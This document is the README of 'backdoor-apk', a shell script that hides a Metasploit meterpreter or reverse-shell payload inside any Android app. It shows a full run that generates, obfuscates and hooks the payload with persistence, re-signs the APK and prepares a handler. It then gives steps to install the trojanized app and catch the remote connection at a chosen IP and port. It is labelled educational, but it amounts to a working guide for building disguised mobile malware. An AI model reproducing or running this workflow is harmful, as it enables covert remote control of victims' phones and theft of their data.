# backdoor-apk
backdoor-apk is a shell script that simplifies the process of adding a backdoor to any Android APK file. Users of this shell script should have working knowledge of Linux, Bash, Metasploit, Apktool, the Android SDK, smali, etc. This shell script is provided as-is without warranty of any kind and is intended for educational purposes only.

Usage:

```
[root:...p/backdoor-apk/backdoor-apk]# ./backdoor-apk.sh ReChat_0.8.16.apk

          ________
         / ______ \
         || _  _ ||
         ||| || |||          AAAAAA      PPPPPPP    KKK  KKK
         |||_||_|||         AAA  AAA     PPP  PPP   KKK KKK
         || _  _o|| (o)    AAAA  AAAA    PPP  PPPP  KKKKKK
         ||| || |||       AAAAAAAAAAAA   PPPPPPPP   KKK KKK
         |||_||_|||      AAAA      AAAA  PPPP       KKK  KKK
         ||______||     AAAA        AAAA PPPP       KKK  KKKK
        /__________\
________|__________|__________________________________________
       /____________\
       |____________|             Dana James Traversie


[*] Running backdoor-apk.sh v0.1.5 on Fri Sep 30 19:38:46 EAT 2016
[+] Android payload options:

1) meterpreter/reverse_http   4) shell/reverse_http
2) meterpreter/reverse_https  5) shell/reverse_https
3) meterpreter/reverse_tcp    6) shell/reverse_tcp
[?] Please select an Android payload option:2

[?] Please enter an LHOST value: 10.9.45.115
[?] Please enter an LPORT value: 443
++++++++ Checking for required Libraries ++++++++
 lib32z1 installed
 lib32ncurses5 installed
 lib32stdc++6 installed

[*] Generating RAT APK file... Done!
   [+] Using payload: android/meterpreter/reverse_https
   [+] Handle the reverse connection at: 10.9.45.115:443
[*] Decompiling RAT APK file... Done!
[*] Decompiling original APK file...  Done!
[*] Merging permissions of original and payload projects...  Done!
[*] Running proguard on RAT APK file...  Done!
[*] Decompiling obfuscated RAT APK file... Done!
[*] Creating new directories in original project for RAT smali files... Done!
[*] Copying RAT smali files to new directories in original project... Done!
[*] Fixing RAT smali files... Done!
[*] Obfuscating const-string values in RAT smali files... Done!
[*] Locating smali file to hook in original project... Done!
[*] Adding hook in original smali file... Done!
[*] Adding persistence hook in original project... Done!
[*] Recompiling original project with backdoor... Done!
[*] Generating RSA key for signing... Done!
[*] Signing recompiled APK... Done!
[*] Verifying signed artifacts... Done!
[*] Aligning recompiled APK... Done!
[*] Generating Metasploit rc file.. Done!

 To start the handler run :   msfconsole -r backdoorApk.rc
```

The recompiled APK will be found in the 'original/dist' directory. Install the APK on a compatible Android device, run it, and handle the meterpreter connection at the specified IP and port (`msfconsole -r backdoorApk.rc`).
